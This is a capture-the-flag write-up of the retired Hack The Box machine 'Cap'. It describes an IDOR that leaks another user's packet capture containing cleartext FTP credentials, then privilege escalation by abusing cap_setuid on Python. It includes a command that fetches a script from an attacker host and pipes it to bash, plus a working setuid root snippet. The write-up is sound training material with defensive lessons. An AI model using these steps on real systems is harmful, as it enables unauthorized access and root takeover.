# Cap

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Date owned** | 2026-10-24 |
| **Retired** | - [x] Confirmed RETIRED on HTB |

> ⚠️ This writeup covers a RETIRED machine only, in line with HTB's rules. No flags, passwords or hashes are published.

## Summary

Cap is an easy Linux machine running a web dashboard (Gunicorn) that exposes live network diagnostics and a packet-capture feature. A predictable capture ID lets us pull another user's `.pcap` (IDOR), which contains cleartext FTP credentials reused for SSH. Root is reached by abusing a Linux capability (`cap_setuid`) left on the Python binary.

## Skills demonstrated
- Web enumeration
- Packet capture analysis (Wireshark)
- IDOR exploitation
- Linux capability abuse for privilege escalation

## Enumeration

### Port scan

```bash
ports=$(nmap -p- --min-rate=1000 -Pn -T4 <TARGET_IP> | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV <TARGET_IP>
```

### Services

| Port | Service | Version | Notes |
|---|---|---|---|
| 21 | FTP | vsftpd | Anonymous login disabled |
| 22 | SSH | OpenSSH | |
| 80 | HTTP | Gunicorn (Python) | Admin dashboard |

### FTP

```bash
ftp <TARGET_IP>
# anonymous login fails -> move on to the web app
```

### Web dashboard

The dashboard exposes pages that just shell out to system tools:
- `IP Config` -> raw `ifconfig` output
- `Network Status` -> raw `netstat` output
- `Security Snapshot` -> triggers a short capture, served at `/data/<id>` and downloadable as a `.pcap`

Our own capture (latest `id`) only contains our own HTTP traffic.

## Foothold / initial access

The capture endpoint increments `id` sequentially with no ownership check on the client-supplied value:

```
GET /data/0
```

This returns a capture from an earlier session — belonging to another user. Classic **Insecure Direct Object Reference (IDOR)**: the app trusts the requested ID instead of verifying who it belongs to.

Opening that capture in Wireshark reveals an unencrypted FTP session, including the full authentication exchange in cleartext. Those credentials are reused for SSH, giving a low-privileged shell.

## Privilege escalation

Upload and run linPEAS:

```bash
# attacker
python3 -m http.server 80

# target
curl http://<ATTACKER_IP>/linpeas.sh | bash
```

linPEAS flags an unusual capability:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` lets a process call `setuid()` and become root without needing the SUID bit — likely granted so the dashboard could run low-level network commands as a non-root user. Exploited directly from a Python shell:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

Result: root shell.

## What this taught me about the system

- **How it worked:** a Flask/Gunicorn app running low-level network diagnostics as a non-root user was given a Linux capability (`cap_setuid`) instead of a narrower one, and its per-user resource access was never scoped by ownership.
- **Well-configured instead:** enforce ownership checks on every object reference (`/data/<id>` should 403 for IDs not owned by the requesting session); grant the minimum capability needed (`cap_net_raw` for packet capture, not `cap_setuid`); never transmit credentials over unencrypted protocols like FTP.
- **Infra takeaway:** on a real system, audit `getcap -r /` regularly — an unexpected capability on an interpreter binary (Python, Perl, etc.) is effectively a root backdoor.

## Key takeaways / lessons learned
- Never trust a client-supplied resource ID — authorize per-request, not just per-session.
- Sniffed credentials still matter: cleartext FTP auth leaked a reusable SSH password.
- Linux capabilities are powerful and easy to over-grant; review them like you would SUID binaries.

## Tools used
- nmap
- Wireshark
- linPEAS
- curl / ftp / ssh
